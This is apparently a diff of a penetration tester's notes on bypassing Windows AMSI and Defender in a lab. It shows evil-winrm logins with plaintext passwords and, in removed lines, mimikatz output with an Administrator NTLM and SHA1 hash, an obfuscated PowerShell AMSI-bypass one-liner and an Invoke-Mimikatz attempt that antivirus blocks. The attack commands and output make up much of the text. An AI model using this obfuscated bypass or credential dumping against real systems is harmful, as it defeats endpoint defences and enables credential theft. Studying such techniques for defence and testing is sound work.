@@ -73,11 +73,11 @@ Windows Security features
 
 
 ================================================================================================================================================
-Example - AMSI bypass techniques 
+Examples of AMSI bypass techniques 
 ================================================================================================================================================
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-Example/Test 1 - AMSI bypass with a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
+Example/Test 1 - Manual AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
@@ -153,9 +153,9 @@ AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\auditor\AppData\Local\Mic
 PS C:\temp>
 
 
-------------------------------------------------------------------------------------------------------------------------------------------------
-Example/Test 2 - AMSI bypass with a local admin user remotely logged on a Windows 2016 server with Defender (AV) enabled and up-to-date
-------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+Example/Test 2 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
+------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 $ evil-winrm -u Administrator -p Test1234 -i 192.168.1.38 -s '/home/kali/Documents/'                                    
 
@@ -286,44 +286,10 @@ SID               : S-1-5-90-0-1
         ssp :
         credman :
 
-Authentication Id : 0 ; 996 (00000000:000003e4)
-Session           : Service from 0
-User Name         : WIN-DV7MRN2F7E8$
-Domain            : WORKGROUP
-Logon Server      : (null)
-Logon Time        : 11/27/2021 3:31:07 PM
-SID               : S-1-5-20
-        msv :
-        tspkg :
-        wdigest :
-         * Username : WIN-DV7MRN2F7E8$
-         * Domain   : WORKGROUP
-         * Password : (null)
-        kerberos :
-         * Username : win-dv7mrn2f7e8$
-         * Domain   : WORKGROUP
-         * Password : (null)
-        ssp :
-        credman :
-
-Authentication Id : 0 ; 440908 (00000000:0006ba4c)
-Session           : Interactive from 1
-User Name         : Administrator
-Domain            : WIN-DV7MRN2F7E8
-Logon Server      : WIN-DV7MRN2F7E8
-Logon Time        : 11/27/2021 5:08:33 PM
-SID               : S-1-5-21-3752995273-3413141572-2984859662-500
-        msv :
-         [00000003] Primary
-         * Username : Administrator
-         * Domain   : WIN-DV7MRN2F7E8
-         * NTLM     : b9e0cfceaf6d077970306a2fd88a7c0a
-         * SHA1     : d7a6378b84d08cb2bc3240c89f81d184f6d69b15
-        tspkg :
 <SNIP>
 
 -----------------------------------------------------------------------------------------------------------------------------------------
-Example/Test 3 - AMSI bypass with a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
+Example/Test 3 - Manual AMSI bypass as a local admin user remotely logged on a Window 10 Laptop with Defender (AV) enabled and up-to-date
 -----------------------------------------------------------------------------------------------------------------------------------------
 
 2.1 Test with Powershell Remoting
@@ -448,42 +414,6 @@ Details: This program is dangerous and executes commands from an attacker.
 Learn more
 Affected items:
 	amsi: \Device\HarddiskVolume3\Windows\System32\wsmprovhost.exe
-
-
-=> Let's try to disable it manually via the Evil-WinRM shell...
-
-┌──(kali㉿kali)-[~/Documents/x64]
-└─$ evil-winrm -u administrator -p 'Totoro42!' -i 192.168.1.35 -e '/home/kali/Documents/x64/' -s '/home/kali/Documents/'                                                                              1 ⨯
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents> $Hxl=$null;
-*Evil-WinRM* PS C:\Users\Administrator\Documents> $xqhoooo="$([cHAr](83*54/54)+[CHAR]([bYTe]0x79)+[chaR]([BytE]0x73)+[cHAR]([ByTE]0x74)+[chAR]([BYte]0x65)+[chAr]([BYTE]0x6d)).$(('MÃ¤nÃ¤g'+'ement').NORmAlize([ChAr](13+57)+[cHAr]([BytE]0x6f)+[CHAR](40+74)+[cHaR](92+17)+[CHAr](68+27-27)) -replace [ChAr]([BYte]0x5c)+[CHar](112)+[chAR]([byte]0x7b)+[chAr](77*64/64)+[ChaR](110)+[char](125*63/63)).$(('AutÃ³m'+'Ã¢tÃ­on').nOrmALIZE([char]([BYtE]0x46)+[CHAr]([BYtE]0x6f)+[ChaR](114+1-1)+[ChaR]([ByTe]0x6d)+[chaR](68)) -replace [cHar]([ByTE]0x5c)+[cHAR]([bYTe]0x70)+[cHAR]([byTe]0x7b)+[cHAR]([byte]0x4d)+[CHar](110+94-94)+[cHAR]([BYtE]0x7d)).$([chAR]([bYTE]0x41)+[CHAR]([byTE]0x6d)+[ChAR]([ByTE]0x73)+[chaR](105+6-6)+[ChaR](85+23-23)+[cHAR](116*86/86)+[cHar](105)+[cHar]([BYtE]0x6c)+[cHAr](115))";
-*Evil-WinRM* PS C:\Users\Administrator\Documents> $wpkfsoadsfehqpe="+[cHAR]([bytE]0x72)+[ChAr](121)+[chAR]([bYtE]0x79)+[cHar](97+3)+[cHar](121+41-41)+[cHAr]([bYte]0x6f)+[cHar]([BYTe]0x66)+[chAr](107+87-87)+[chAr]([BYTE]0x69)";
-*Evil-WinRM* PS C:\Users\Administrator\Documents> [Threading.Thread]::Sleep(286);
-*Evil-WinRM* PS C:\Users\Administrator\Documents> [Ref].Assembly.GetType($xqhoooo).GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR](105+75-75)+[CHar]([ByTe]0x49)+[chAr]([bytE]0x6e)+[CHar](37+68)+[cHAr](116+2-2)+[Char](70+37-37)+[char](97)+[chAR]([BYTE]0x69)+[chaR](93+15)+[CHAr]([byte]0x65)+[char](100)),"NonPublic,Static").SetValue($Hxl,$true);
-You cannot call a method on a null-valued expression.
-At line:1 char:45
-+ ... .GetField($([char](71+26)+[char]([BYtE]0x6d)+[CHar]([byte]0x73)+[chaR ...
-+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
-    + FullyQualifiedErrorId : InvokeMethodOnNull
-
-*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz.ps1
-*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Mimikatz
-At line:1 char:1
-+ Invoke-Mimikatz
-+ ~~~~~~~~~~~~~~~
-This script contains malicious content and has been blocked by your antivirus software.
-    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
-    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
-
-
-=> My bypass is not working via Evil-WinRM...
 
 
 -------------------------------------------------------------------------------------------------------------------------
